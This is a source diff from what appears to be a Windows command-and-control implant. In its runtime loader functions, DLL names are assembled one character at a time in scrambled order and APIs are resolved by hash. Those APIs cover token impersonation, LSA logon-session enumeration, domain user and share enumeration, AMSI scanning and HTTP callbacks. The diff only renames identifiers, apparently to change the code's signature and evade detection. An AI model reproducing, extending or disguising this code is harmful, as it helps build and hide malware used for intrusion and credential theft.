@@ -6,24 +6,24 @@
 BOOL RtAdvapi32(
     VOID
 ) {
-    CHAR ModuleName[ 13 ] = { 0 };
+    CHAR ModNa[ 13 ] = { 0 };
 
-    ModuleName[ 0  ] = HideChar('A');
-    ModuleName[ 2  ] = HideChar('V');
-    ModuleName[ 11 ] = HideChar('L');
-    ModuleName[ 10 ] = HideChar('L');
-    ModuleName[ 3  ] = HideChar('A');
-    ModuleName[ 8  ] = HideChar('.');
-    ModuleName[ 12 ] = HideChar('\0');
-    ModuleName[ 6  ] = HideChar('3');
-    ModuleName[ 7  ] = HideChar('2');
-    ModuleName[ 1  ] = HideChar('D');
-    ModuleName[ 9  ] = HideChar('D');
-    ModuleName[ 5  ] = HideChar('I');
-    ModuleName[ 4  ] = HideChar('P');
+    ModNa[ 0  ] = HiChara('A');
+    ModNa[ 2  ] = HiChara('V');
+    ModNa[ 11 ] = HiChara('L');
+    ModNa[ 10 ] = HiChara('L');
+    ModNa[ 3  ] = HiChara('A');
+    ModNa[ 8  ] = HiChara('.');
+    ModNa[ 12 ] = HiChara('\0');
+    ModNa[ 6  ] = HiChara('3');
+    ModNa[ 7  ] = HiChara('2');
+    ModNa[ 1  ] = HiChara('D');
+    ModNa[ 9  ] = HiChara('D');
+    ModNa[ 5  ] = HiChara('I');
+    ModNa[ 4  ] = HiChara('P');
 
-    if ( ( Instance->Modules.Advapi32 = LoaderModLod( ModuleName ) ) ) {
-        MemZero( ModuleName, sizeof( ModuleName ) );
+    if ( ( Instance->Modules.Advapi32 = LoaderModLod( ModNa ) ) ) {
+        MemeZ( ModNa, sizeof( ModNa ) );
         Instance->Win32.GetTokenInformation          = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_GETTOKENINFORMATION );
         Instance->Win32.CreateProcessWithTokenW      = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_CREATEPROCESSWITHTOKENW );
         Instance->Win32.CreateProcessWithLogonW      = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_CREATEPROCESSWITHLOGONW );
@@ -54,10 +54,10 @@ BOOL RtAdvapi32(
         Instance->Win32.GetSidSubAuthorityCount      = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_GETSIDSUBAUTHORITYCOUNT );
         Instance->Win32.GetSidSubAuthority           = LoaderFuncAdd( Instance->Modules.Advapi32, H_FUNC_GETSIDSUBAUTHORITY );
 
-        PUTS( "Loaded Advapi32 functions" )
+        STUP( "Loaded Advapi32 functions" )
     } else {
-        MemZero( ModuleName, sizeof( ModuleName ) );
-        PUTS( "Failed to load Advapi32" )
+        MemeZ( ModNa, sizeof( ModNa ) );
+        STUP( "Failed to load Advapi32" )
         return FALSE;
     }
 
@@ -68,32 +68,32 @@ BOOL RtAdvapi32(
 BOOL RtMscoree(
     VOID
 ) {
-    CHAR ModuleName[ 12 ] = { 0 };
+    CHAR ModNa[ 12 ] = { 0 };
 
     if ( Instance->Win32.CLRCreateInstance )
         return TRUE;
 
-    ModuleName[ 1  ] = HideChar('S');
-    ModuleName[ 2  ] = HideChar('C');
-    ModuleName[ 11 ] = HideChar(0);
-    ModuleName[ 0  ] = HideChar('M');
-    ModuleName[ 10 ] = HideChar('L');
-    ModuleName[ 8  ] = HideChar('D');
-    ModuleName[ 7  ] = HideChar('.');
-    ModuleName[ 9  ] = HideChar('L');
-    ModuleName[ 5  ] = HideChar('E');
-    ModuleName[ 4  ] = HideChar('R');
-    ModuleName[ 6  ] = HideChar('E');
-    ModuleName[ 3  ] = HideChar('O');
+    ModNa[ 1  ] = HiChara('S');
+    ModNa[ 2  ] = HiChara('C');
+    ModNa[ 11 ] = HiChara(0);
+    ModNa[ 0  ] = HiChara('M');
+    ModNa[ 10 ] = HiChara('L');
+    ModNa[ 8  ] = HiChara('D');
+    ModNa[ 7  ] = HiChara('.');
+    ModNa[ 9  ] = HiChara('L');
+    ModNa[ 5  ] = HiChara('E');
+    ModNa[ 4  ] = HiChara('R');
+    ModNa[ 6  ] = HiChara('E');
+    ModNa[ 3  ] = HiChara('O');
 
-    if ( ( Instance->Modules.Mscoree = LoaderModLod( ModuleName ) ) ) {
-        MemZero( ModuleName, sizeof( ModuleName ) );
+    if ( ( Instance->Modules.Mscoree = LoaderModLod( ModNa ) ) ) {
+        MemeZ( ModNa, sizeof( ModNa ) );
         Instance->Win32.CLRCreateInstance = LoaderFuncAdd( Instance->Modules.Mscoree, H_FUNC_CLRCREATEINSTANCE );
 
-        PUTS( "Loaded Mscoree functions" )
+        STUP( "Loaded Mscoree functions" )
     } else {
-        MemZero( ModuleName, sizeof( ModuleName ) );
-        PUTS( "Failed to load Mscoree" )
+        MemeZ( ModNa, sizeof( ModNa ) );
+        STUP( "Failed to load Mscoree" )
         return FALSE;
     }
 
@@ -103,24 +103,24 @@ BOOL RtMscoree(
 BOOL RtOleaut32(
     VOID
 ) {
-    CHAR ModuleName[ 13 ] = { 0 };
+    CHAR ModNa[ 13 ] = { 0 };
 
-    ModuleName[ 3  ] = HideChar('A');
-    ModuleName[ 2  ] = HideChar('E');
-    ModuleName[ 0  ] = HideChar('O');
-    ModuleName[ 1  ] = HideChar('L');
-    ModuleName[ 5  ] = HideChar('T');
-    ModuleName[ 11 ] = HideChar('L');
-    ModuleName[ 7  ] = HideChar('2');
-    ModuleName[ 6  ] = HideChar('3');
-    ModuleName[ 10 ] = HideChar('L');
-    ModuleName[ 12 ] = HideChar(0);
-    ModuleName[ 4  ] = HideChar('U');
-    ModuleName[ 9  ] = HideChar('D');
-    ModuleName[ 8  ] = HideChar('.');
+    ModNa[ 3  ] = HiChara('A');
+    ModNa[ 2  ] = HiChara('E');
+    ModNa[ 0  ] = HiChara('O');
+    ModNa[ 1  ] = HiChara('L');
+    ModNa[ 5  ] = HiChara('T');
+    ModNa[ 11 ] = HiChara('L');
+    ModNa[ 7  ] = HiChara('2');
+    ModNa[ 6  ] = HiChara('3');
+    ModNa[ 10 ] = HiChara('L');
+    ModNa[ 12 ] = HiChara(0);
+    ModNa[ 4  ] = HiChara('U');
+    ModNa[ 9  ] = HiChara('D');
+    ModNa[ 8  ] = HiChara('.');
 
-    if ( ( Instance->Modules.Oleaut32 = LoaderModLod( ModuleName ) ) ) {
-        MemZero( ModuleName, sizeof( ModuleName ) );
+    if ( ( Instance->Modules.Oleaut32 = LoaderModLod( ModNa ) ) ) {
+        MemeZ( ModNa, sizeof( ModNa ) );
         Instance->Win32.SafeArrayAccessData   = LoaderFuncAdd( Instance->Modules.Oleaut32, H_FUNC_SAFEARRAYACCESSDATA );
         Instance->Win32.SafeArrayUnaccessData = LoaderFuncAdd( Instance->Modules.Oleaut32, H_FUNC_SAFEARRAYUNACCESSDATA );
         Instance->Win32.SafeArrayCreate       = LoaderFuncAdd( Instance->Modules.Oleaut32, H_FUNC_SAFEARRAYCREATE );
@@ -129,10 +129,10 @@ BOOL RtOleaut32(
         Instance->Win32.SafeArrayDestroy      = LoaderFuncAdd( Instance->Modules.Oleaut32, H_FUNC_SAFEARRAYDESTROY );
         Instance->Win32.SysAllocString        = LoaderFuncAdd( Instance->Modules.Oleaut32, H_FUNC_SYSALLOCSTRING );
 
-        PUTS( "Loaded Oleaut32 functions" )
+        STUP( "Loaded Oleaut32 functions" )
     } else {
-        MemZero( ModuleName, sizeof( ModuleName ) );
-        PUTS( "Failed to load Oleaut32" )
+        MemeZ( ModNa, sizeof( ModNa ) );
+        STUP( "Failed to load Oleaut32" )
         return FALSE;
     }
 
@@ -142,31 +142,31 @@ BOOL RtOleaut32(
 BOOL RtUser32(
     VOID
 ) {
-    CHAR ModuleName[ 11 ] = { 0 };
+    CHAR ModNa[ 11 ] = { 0 };
 
-    ModuleName[ 1  ] = HideChar('S');
-    ModuleName[ 0  ] = HideChar('U');
-    ModuleName[ 10 ] = HideChar(0);
-    ModuleName[ 6  ] = HideChar('.');
-    ModuleName[ 8  ] = HideChar('L');
-    ModuleName[ 7  ] = HideChar('D');
-    ModuleName[ 5  ] = HideChar('2');
-    ModuleName[ 3  ] = HideChar('R');
-    ModuleName[ 9  ] = HideChar('L');
-    ModuleName[ 2  ] = HideChar('E');
-    ModuleName[ 4  ] = HideChar('3');
+    ModNa[ 1  ] = HiChara('S');
+    ModNa[ 0  ] = HiChara('U');
+    ModNa[ 10 ] = HiChara(0);
+    ModNa[ 6  ] = HiChara('.');
+    ModNa[ 8  ] = HiChara('L');
+    ModNa[ 7  ] = HiChara('D');
+    ModNa[ 5  ] = HiChara('2');
+    ModNa[ 3  ] = HiChara('R');
+    ModNa[ 9  ] = HiChara('L');
+    ModNa[ 2  ] = HiChara('E');
+    ModNa[ 4  ] = HiChara('3');
 
-    if ( ( Instance->Modules.User32 = LoaderModLod( ModuleName ) ) ) {
-        MemZero( ModuleName, sizeof( ModuleName ) );
+    if ( ( Instance->Modules.User32 = LoaderModLod( ModNa ) ) ) {
+        MemeZ( ModNa, sizeof( ModNa ) );
         Instance->Win32.ShowWindow       = LoaderFuncAdd( Instance->Modules.User32, H_FUNC_SHOWWINDOW );
         Instance->Win32.GetSystemMetrics = LoaderFuncAdd( Instance->Modules.User32, H_FUNC_GETSYSTEMMETRICS );
         Instance->Win32.GetDC            = LoaderFuncAdd( Instance->Modules.User32, H_FUNC_GETDC );
         Instance->Win32.ReleaseDC        = LoaderFuncAdd( Instance->Modules.User32, H_FUNC_RELEASEDC );
 
-        PUTS( "Loaded User32 functions" )
+        STUP( "Loaded User32 functions" )
     } else {
-        MemZero( ModuleName, sizeof( ModuleName ) );
-        PUTS( "Failed to load User32" )
+        MemeZ( ModNa, sizeof( ModNa ) );
+        STUP( "Failed to load User32" )
         return FALSE;
     }
 
@@ -176,29 +176,29 @@ BOOL RtUser32(
 BOOL RtShell32(
     VOID
 ) {
-    CHAR ModuleName[ 12 ] = { 0 };
+    CHAR ModNa[ 12 ] = { 0 };
 
-    ModuleName[ 0  ] = HideChar('S');
-    ModuleName[ 10 ] = HideChar('L');
-    ModuleName[ 7  ] = HideChar('.');
-    ModuleName[ 6  ] = HideChar('2');
-    ModuleName[ 8  ] = HideChar('D');
-    ModuleName[ 4  ] = HideChar('L');
-    ModuleName[ 1  ] = HideChar('H');
-    ModuleName[ 11 ] = HideChar(0);
-    ModuleName[ 9  ] = HideChar('L');
-    ModuleName[ 5  ] = HideChar('3');
-    ModuleName[ 3  ] = HideChar('L');
-    ModuleName[ 2  ] = HideChar('E');
+    ModNa[ 0  ] = HiChara('S');
+    ModNa[ 10 ] = HiChara('L');
+    ModNa[ 7  ] = HiChara('.');
+    ModNa[ 6  ] = HiChara('2');
+    ModNa[ 8  ] = HiChara('D');
+    ModNa[ 4  ] = HiChara('L');
+    ModNa[ 1  ] = HiChara('H');
+    ModNa[ 11 ] = HiChara(0);
+    ModNa[ 9  ] = HiChara('L');
+    ModNa[ 5  ] = HiChara('3');
+    ModNa[ 3  ] = HiChara('L');
+    ModNa[ 2  ] = HiChara('E');
 
-    if ( ( Instance->Modules.Shell32 = LoaderModLod( ModuleName ) ) ) {
-        MemZero( ModuleName, sizeof( ModuleName ) );
+    if ( ( Instance->Modules.Shell32 = LoaderModLod( ModNa ) ) ) {
+        MemeZ( ModNa, sizeof( ModNa ) );
         Instance->Win32.CommandLineToArgvW = LoaderFuncAdd( Instance->Modules.Shell32, H_FUNC_COMMANDLINETOARGVW );
 
-        PUTS( "Loaded Shell32 functions" )
+        STUP( "Loaded Shell32 functions" )
     } else {
-        MemZero( ModuleName, sizeof( ModuleName ) );
-        PUTS( "Failed to load Shell32" )
+        MemeZ( ModNa, sizeof( ModNa ) );
+        STUP( "Failed to load Shell32" )
         return FALSE;
     }
 
@@ -208,29 +208,29 @@ BOOL RtShell32(
 BOOL RtMsvcrt(
     VOID
 ) {
-    CHAR ModuleName[ 11 ] = { 0 };
+    CHAR ModNa[ 11 ] = { 0 };
 
-    ModuleName[ 0  ] = HideChar('M');
-    ModuleName[ 6  ] = HideChar('.');
-    ModuleName[ 10 ] = HideChar(0);
-    ModuleName[ 9  ] = HideChar('L');
-    ModuleName[ 4  ] = HideChar('R');
-    ModuleName[ 2  ] = HideChar('V');
-    ModuleName[ 8  ] = HideChar('L');
-    ModuleName[ 7  ] = HideChar('D');
-    ModuleName[ 3  ] = HideChar('C');
-    ModuleName[ 5  ] = HideChar('T');
-    ModuleName[ 1  ] = HideChar('S');
+    ModNa[ 0  ] = HiChara('M');
+    ModNa[ 6  ] = HiChara('.');
+    ModNa[ 10 ] = HiChara(0);
+    ModNa[ 9  ] = HiChara('L');
+    ModNa[ 4  ] = HiChara('R');
+    ModNa[ 2  ] = HiChara('V');
+    ModNa[ 8  ] = HiChara('L');
+    ModNa[ 7  ] = HiChara('D');
+    ModNa[ 3  ] = HiChara('C');
+    ModNa[ 5  ] = HiChara('T');
+    ModNa[ 1  ] = HiChara('S');
 
-    if ( ( Instance->Modules.Msvcrt = LoaderModLod( ModuleName ) ) ) {
-        MemZero( ModuleName, sizeof( ModuleName ) );
+    if ( ( Instance->Modules.Msvcrt = LoaderModLod( ModNa ) ) ) {
+        MemeZ( ModNa, sizeof( ModNa ) );
         Instance->Win32.vsnprintf  = LoaderFuncAdd( Instance->Modules.Msvcrt, H_FUNC_VSNPRINTF );
         Instance->Win32.swprintf_s = LoaderFuncAdd( Instance->Modules.Msvcrt, H_FUNC_SWPRINTF_S );
 
-        PUTS( "Loaded Msvcrt functions" )
+        STUP( "Loaded Msvcrt functions" )
     } else {
-        MemZero( ModuleName, sizeof( ModuleName ) );
-        PUTS( "Failed to load Msvcrt" )
+        MemeZ( ModNa, sizeof( ModNa ) );
+        STUP( "Failed to load Msvcrt" )
         return FALSE;
     }
 
@@ -240,30 +240,30 @@ BOOL RtMsvcrt(
 BOOL RtIphlpapi(
     VOID
 ) {
-    CHAR ModuleName[ 13 ] = { 0 };
+    CHAR ModNa[ 13 ] = { 0 };
 
-    ModuleName[ 8  ] = HideChar('.');
-    ModuleName[ 0  ] = HideChar('I');
-    ModuleName[ 10 ] = HideChar('L');
-    ModuleName[ 2  ] = HideChar('H');
-    ModuleName[ 9  ] = HideChar('D');
-    ModuleName[ 6  ] = HideChar('P');
-    ModuleName[ 11 ] = HideChar('L');
-    ModuleName[ 1  ] = HideChar('P');
-    ModuleName[ 3  ] = HideChar('L');
-    ModuleName[ 12 ] = HideChar(0);
-    ModuleName[ 5  ] = HideChar('A');
-    ModuleName[ 4  ] = HideChar('P');
-    ModuleName[ 7  ] = HideChar('I');
+    ModNa[ 8  ] = HiChara('.');
+    ModNa[ 0  ] = HiChara('I');
+    ModNa[ 10 ] = HiChara('L');
+    ModNa[ 2  ] = HiChara('H');
+    ModNa[ 9  ] = HiChara('D');
+    ModNa[ 6  ] = HiChara('P');
+    ModNa[ 11 ] = HiChara('L');
+    ModNa[ 1  ] = HiChara('P');
+    ModNa[ 3  ] = HiChara('L');
+    ModNa[ 12 ] = HiChara(0);
+    ModNa[ 5  ] = HiChara('A');
+    ModNa[ 4  ] = HiChara('P');
+    ModNa[ 7  ] = HiChara('I');
 
-    if ( ( Instance->Modules.Iphlpapi = LoaderModLod( ModuleName ) ) ) {
-        MemZero( ModuleName, sizeof( ModuleName ) );
+    if ( ( Instance->Modules.Iphlpapi = LoaderModLod( ModNa ) ) ) {
+        MemeZ( ModNa, sizeof( ModNa ) );
         Instance->Win32.GetAdaptersInfo = LoaderFuncAdd( Instance->Modules.Iphlpapi, H_FUNC_GETADAPTERSINFO );
 
-        PUTS( "Loaded Iphlpapi functions" )
+        STUP( "Loaded Iphlpapi functions" )
     } else {
-        MemZero( ModuleName, sizeof( ModuleName ) );
-        PUTS( "Failed to load Iphlpapi" )
+        MemeZ( ModNa, sizeof( ModNa ) );
+        STUP( "Failed to load Iphlpapi" )
         return FALSE;
     }
 
@@ -273,21 +273,21 @@ BOOL RtIphlpapi(
 BOOL RtGdi32(
     VOID
 ) {
-    CHAR ModuleName[ 10 ] = { 0 };
+    CHAR ModNa[ 10 ] = { 0 };
 
-    ModuleName[ 4 ] = HideChar('2');
-    ModuleName[ 6 ] = HideChar('D');
-    ModuleName[ 5 ] = HideChar('.');
-    ModuleName[ 8 ] = HideChar('L');
-    ModuleName[ 2 ] = HideChar('I');
-    ModuleName[ 1 ] = HideChar('D');
-    ModuleName[ 7 ] = HideChar('L');
-    ModuleName[ 9 ] = HideChar(0);
-    ModuleName[ 0 ] = HideChar('G');
-    ModuleName[ 3 ] = HideChar('3');
+    ModNa[ 4 ] = HiChara('2');
+    ModNa[ 6 ] = HiChara('D');
+    ModNa[ 5 ] = HiChara('.');
+    ModNa[ 8 ] = HiChara('L');
+    ModNa[ 2 ] = HiChara('I');
+    ModNa[ 1 ] = HiChara('D');
+    ModNa[ 7 ] = HiChara('L');
+    ModNa[ 9 ] = HiChara(0);
+    ModNa[ 0 ] = HiChara('G');
+    ModNa[ 3 ] = HiChara('3');
 
-    if ( ( Instance->Modules.Gdi32 = LoaderModLod( ModuleName ) ) ) {
-        MemZero( ModuleName, sizeof( ModuleName ) );
+    if ( ( Instance->Modules.Gdi32 = LoaderModLod( ModNa ) ) ) {
+        MemeZ( ModNa, sizeof( ModNa ) );
         Instance->Win32.GetCurrentObject   = LoaderFuncAdd( Instance->Modules.Gdi32, H_FUNC_GETCURRENTOBJECT );
         Instance->Win32.GetObjectW         = LoaderFuncAdd( Instance->Modules.Gdi32, H_FUNC_GETOBJECTW );
         Instance->Win32.CreateCompatibleDC = LoaderFuncAdd( Instance->Modules.Gdi32, H_FUNC_CREATECOMPATIBLEDC );
@@ -297,10 +297,10 @@ BOOL RtGdi32(
         Instance->Win32.DeleteObject       = LoaderFuncAdd( Instance->Modules.Gdi32, H_FUNC_DELETEOBJECT );
         Instance->Win32.DeleteDC           = LoaderFuncAdd( Instance->Modules.Gdi32, H_FUNC_DELETEDC );
 
-        PUTS( "Loaded Gdi32 functions" )
+        STUP( "Loaded Gdi32 functions" )
     } else {
-        MemZero( ModuleName, sizeof( ModuleName ) );
-        PUTS( "Failed to load Gdi32" )
+        MemeZ( ModNa, sizeof( ModNa ) );
+        STUP( "Failed to load Gdi32" )
         return FALSE;
     }
 
@@ -310,24 +310,24 @@ BOOL RtGdi32(
 BOOL RtNetApi32(
     VOID
 ) {
-    CHAR ModuleName[ 13 ] = { 0 };
+    CHAR ModNa[ 13 ] = { 0 };
 
-    ModuleName[ 0  ] = HideChar('N');
-    ModuleName[ 11 ] = HideChar('L');
-    ModuleName[ 8  ] = HideChar('.');
-    ModuleName[ 9  ] = HideChar('D');
-    ModuleName[ 6  ] = HideChar('3');
-    ModuleName[ 2  ] = HideChar('T');
-    ModuleName[ 3  ] = HideChar('A');
-    ModuleName[ 10 ] = HideChar('L');
-    ModuleName[ 12 ] = HideChar(0);
-    ModuleName[ 4  ] = HideChar('P');
-    ModuleName[ 5  ] = HideChar('I');
-    ModuleName[ 1  ] = HideChar('E');
-    ModuleName[ 7  ] = HideChar('2');
+    ModNa[ 0  ] = HiChara('N');
+    ModNa[ 11 ] = HiChara('L');
+    ModNa[ 8  ] = HiChara('.');
+    ModNa[ 9  ] = HiChara('D');
+    ModNa[ 6  ] = HiChara('3');
+    ModNa[ 2  ] = HiChara('T');
+    ModNa[ 3  ] = HiChara('A');
+    ModNa[ 10 ] = HiChara('L');
+    ModNa[ 12 ] = HiChara(0);
+    ModNa[ 4  ] = HiChara('P');
+    ModNa[ 5  ] = HiChara('I');
+    ModNa[ 1  ] = HiChara('E');
+    ModNa[ 7  ] = HiChara('2');
 
-    if ( ( Instance->Modules.NetApi32 = LoaderModLod( ModuleName ) ) ) {
-        MemZero( ModuleName, sizeof( ModuleName ) );
+    if ( ( Instance->Modules.NetApi32 = LoaderModLod( ModNa ) ) ) {
+        MemeZ( ModNa, sizeof( ModNa ) );
         Instance->Win32.NetLocalGroupEnum = LoaderFuncAdd( Instance->Modules.NetApi32, H_FUNC_NETLOCALGROUPENUM );
         Instance->Win32.NetGroupEnum      = LoaderFuncAdd( Instance->Modules.NetApi32, H_FUNC_NETGROUPENUM );
         Instance->Win32.NetUserEnum       = LoaderFuncAdd( Instance->Modules.NetApi32, H_FUNC_NETUSERENUM );
@@ -336,10 +336,10 @@ BOOL RtNetApi32(
         Instance->Win32.NetShareEnum      = LoaderFuncAdd( Instance->Modules.NetApi32, H_FUNC_NETSHAREENUM );
         Instance->Win32.NetApiBufferFree  = LoaderFuncAdd( Instance->Modules.NetApi32, H_FUNC_NETAPIBUFFERFREE );
 
-        PUTS( "Loaded NetApi32 functions" )
+        STUP( "Loaded NetApi32 functions" )
     } else {
-        MemZero( ModuleName, sizeof( ModuleName ) );
-        PUTS( "Failed to load NetApi32" )
+        MemeZ( ModNa, sizeof( ModNa ) );
+        STUP( "Failed to load NetApi32" )
         return FALSE;
     }
 
@@ -349,22 +349,22 @@ BOOL RtNetApi32(
 BOOL RtWs2_32(
     VOID
 ) {
-    CHAR ModuleName[ 11 ] = { 0 };
+    CHAR ModNa[ 11 ] = { 0 };
 
-    ModuleName[ 0  ] = HideChar('W');
-    ModuleName[ 2  ] = HideChar('2');
-    ModuleName[ 4  ] = HideChar('3');
-    ModuleName[ 6  ] = HideChar('.');
-    ModuleName[ 9  ] = HideChar('L');
-    ModuleName[ 1  ] = HideChar('S');
-    ModuleName[ 3  ] = HideChar('_');
-    ModuleName[ 5  ] = HideChar('2');
-    ModuleName[ 10 ] = HideChar(0);
-    ModuleName[ 8  ] = HideChar('L');
-    ModuleName[ 7  ] = HideChar('D');
+    ModNa[ 0  ] = HiChara('W');
+    ModNa[ 2  ] = HiChara('2');
+    ModNa[ 4  ] = HiChara('3');
+    ModNa[ 6  ] = HiChara('.');
+    ModNa[ 9  ] = HiChara('L');
+    ModNa[ 1  ] = HiChara('S');
+    ModNa[ 3  ] = HiChara('_');
+    ModNa[ 5  ] = HiChara('2');
+    ModNa[ 10 ] = HiChara(0);
+    ModNa[ 8  ] = HiChara('L');
+    ModNa[ 7  ] = HiChara('D');
 
-    if ( ( Instance->Modules.Ws2_32 = LoaderModLod( ModuleName ) ) ) {
-        MemZero( ModuleName, sizeof( ModuleName ) );
+    if ( ( Instance->Modules.Ws2_32 = LoaderModLod( ModNa ) ) ) {
+        MemeZ( ModNa, sizeof( ModNa ) );
         Instance->Win32.WSAStartup      = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_WSASTARTUP );
         Instance->Win32.WSACleanup      = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_WSACLEANUP );
         Instance->Win32.WSASocketA      = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_WSASOCKETA );
@@ -380,10 +380,10 @@ BOOL RtWs2_32(
         Instance->Win32.getaddrinfo     = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_GETADDRINFO );
         Instance->Win32.freeaddrinfo    = LoaderFuncAdd( Instance->Modules.Ws2_32, H_FUNC_FREEADDRINFO );
 
-        PUTS( "Loaded Ws2_32 functions" )
+        STUP( "Loaded Ws2_32 functions" )
     } else {
-        MemZero( ModuleName, sizeof( ModuleName ) );
-        PUTS( "Failed to load Ws2_32" )
+        MemeZ( ModNa, sizeof( ModNa ) );
+        STUP( "Failed to load Ws2_32" )
         return FALSE;
     }
 
@@ -394,23 +394,23 @@ BOOL RtWs2_32(
 BOOL RtSspicli(
     VOID
 ) {
-    CHAR ModuleName[ 12 ] = { 0 };
+    CHAR ModNa[ 12 ] = { 0 };
 
-    ModuleName[ 0  ] = HideChar('S');
-    ModuleName[ 11 ] = HideChar(0);
-    ModuleName[ 9  ] = HideChar('L');
-    ModuleName[ 1  ] = HideChar('S');
-    ModuleName[ 6  ] = HideChar('I');
-    ModuleName[ 7  ] = HideChar('.');
-    ModuleName[ 5  ] = HideChar('L');
-    ModuleName[ 8  ] = HideChar('D');
-    ModuleName[ 2  ] = HideChar('P');
-    ModuleName[ 10 ] = HideChar('L');
-    ModuleName[ 4  ] = HideChar('C');
-    ModuleName[ 3  ] = HideChar('I');
+    ModNa[ 0  ] = HiChara('S');
+    ModNa[ 11 ] = HiChara(0);
+    ModNa[ 9  ] = HiChara('L');
+    ModNa[ 1  ] = HiChara('S');
+    ModNa[ 6  ] = HiChara('I');
+    ModNa[ 7  ] = HiChara('.');
+    ModNa[ 5  ] = HiChara('L');
+    ModNa[ 8  ] = HiChara('D');
+    ModNa[ 2  ] = HiChara('P');
+    ModNa[ 10 ] = HiChara('L');
+    ModNa[ 4  ] = HiChara('C');
+    ModNa[ 3  ] = HiChara('I');
 
-    if ( ( Instance->Modules.Sspicli = LoaderModLod( ModuleName ) ) ) {
-        MemZero( ModuleName, sizeof( ModuleName ) );
+    if ( ( Instance->Modules.Sspicli = LoaderModLod( ModNa ) ) ) {
+        MemeZ( ModNa, sizeof( ModNa ) );
         Instance->Win32.LsaRegisterLogonProcess        = LoaderFuncAdd( Instance->Modules.Sspicli, H_FUNC_LSAREGISTERLOGONPROCESS );
         Instance->Win32.LsaLookupAuthenticationPackage = LoaderFuncAdd( Instance->Modules.Sspicli, H_FUNC_LSALOOKUPAUTHENTICATIONPACKAGE );
         Instance->Win32.LsaDeregisterLogonProcess      = LoaderFuncAdd( Instance->Modules.Sspicli, H_FUNC_LSADEREGISTERLOGONPROCESS );
@@ -420,10 +420,10 @@ BOOL RtSspicli(
         Instance->Win32.LsaGetLogonSessionData         = LoaderFuncAdd( Instance->Modules.Sspicli, H_FUNC_LSAGETLOGONSESSIONDATA );
         Instance->Win32.LsaEnumerateLogonSessions      = LoaderFuncAdd( Instance->Modules.Sspicli, H_FUNC_LSAENUMERATELOGONSESSIONS );
 
-        PUTS( "Loaded Sspicli functions" )
+        STUP( "Loaded Sspicli functions" )
     } else {
-        MemZero( ModuleName, sizeof( ModuleName ) );
-        PUTS( "Failed to load Sspicli" )
+        MemeZ( ModNa, sizeof( ModNa ) );
+        STUP( "Failed to load Sspicli" )
         return FALSE;
     }
 
@@ -433,26 +433,26 @@ BOOL RtSspicli(
 BOOL RtAmsi(
     VOID
 ) {
-    CHAR ModuleName[ 9 ] = { 0 };
+    CHAR ModNa[ 9 ] = { 0 };
 
-    ModuleName[ 3 ] = HideChar('I');
-    ModuleName[ 5 ] = HideChar('D');
-    ModuleName[ 7 ] = HideChar('L');
-    ModuleName[ 8 ] = HideChar(0);
-    ModuleName[ 6 ] = HideChar('L');
-    ModuleName[ 4 ] = HideChar('.');
-    ModuleName[ 0 ] = HideChar('A');
-    ModuleName[ 1 ] = HideChar('M');
-    ModuleName[ 2 ] = HideChar('S');
+    ModNa[ 3 ] = HiChara('I');
+    ModNa[ 5 ] = HiChara('D');
+    ModNa[ 7 ] = HiChara('L');
+    ModNa[ 8 ] = HiChara(0);
+    ModNa[ 6 ] = HiChara('L');
+    ModNa[ 4 ] = HiChara('.');
+    ModNa[ 0 ] = HiChara('A');
+    ModNa[ 1 ] = HiChara('M');
+    ModNa[ 2 ] = HiChara('S');
 
-    if ( ( Instance->Modules.Amsi = LoaderModLod( ModuleName ) ) ) {
-        MemZero( ModuleName, sizeof( ModuleName ) );
+    if ( ( Instance->Modules.Amsi = LoaderModLod( ModNa ) ) ) {
+        MemeZ( ModNa, sizeof( ModNa ) );
         Instance->Win32.AmsiScanBuffer = LoaderFuncAdd( Instance->Modules.Amsi, H_FUNC_AMSISCANBUFFER );
 
-        PUTS( "Loaded Amsi functions" )
+        STUP( "Loaded Amsi functions" )
     } else {
-        MemZero( ModuleName, sizeof( ModuleName ) );
-        PUTS( "Failed to load Amsi" )
+        MemeZ( ModNa, sizeof( ModNa ) );
+        STUP( "Failed to load Amsi" )
         return FALSE;
     }
 
@@ -463,23 +463,23 @@ BOOL RtAmsi(
 BOOL RtWinHttp(
     VOID
 ) {
-    CHAR ModuleName[ 12 ] = { 0 };
+    CHAR ModNa[ 12 ] = { 0 };
 
-    ModuleName[ 0  ] = HideChar('W');
-    ModuleName[ 2  ] = HideChar('N');
-    ModuleName[ 7  ] = HideChar('.');
-    ModuleName[ 11 ] = HideChar(0);
-    ModuleName[ 10 ] = HideChar('L');
-    ModuleName[ 4  ] = HideChar('T');
-    ModuleName[ 8  ] = HideChar('D');
-    ModuleName[ 1  ] = HideChar('I');
-    ModuleName[ 9  ] = HideChar('L');
-    ModuleName[ 6  ] = HideChar('P');
-    ModuleName[ 3  ] = HideChar('H');
-    ModuleName[ 5  ] = HideChar('T');
+    ModNa[ 0  ] = HiChara('W');
+    ModNa[ 2  ] = HiChara('N');
+    ModNa[ 7  ] = HiChara('.');
+    ModNa[ 11 ] = HiChara(0);
+    ModNa[ 10 ] = HiChara('L');
+    ModNa[ 4  ] = HiChara('T');
+    ModNa[ 8  ] = HiChara('D');
+    ModNa[ 1  ] = HiChara('I');
+    ModNa[ 9  ] = HiChara('L');
+    ModNa[ 6  ] = HiChara('P');
+    ModNa[ 3  ] = HiChara('H');
+    ModNa[ 5  ] = HiChara('T');
 
-    if ( ( Instance->Modules.WinHttp = LoaderModLod( ModuleName ) ) ) {
-        MemZero( ModuleName, sizeof( ModuleName ) );
+    if ( ( Instance->Modules.WinHttp = LoaderModLod( ModNa ) ) ) {
+        MemeZ( ModNa, sizeof( ModNa ) );
         Instance->Win32.WinHttpOpen                           = LoaderFuncAdd( Instance->Modules.WinHttp, H_FUNC_WINHTTPOPEN );
         Instance->Win32.WinHttpConnect                        = LoaderFuncAdd( Instance->Modules.WinHttp, H_FUNC_WINHTTPCONNECT );
         Instance->Win32.WinHttpOpenRequest                    = LoaderFuncAdd( Instance->Modules.WinHttp, H_FUNC_WINHTTPOPENREQUEST );
@@ -493,10 +493,10 @@ BOOL RtWinHttp(
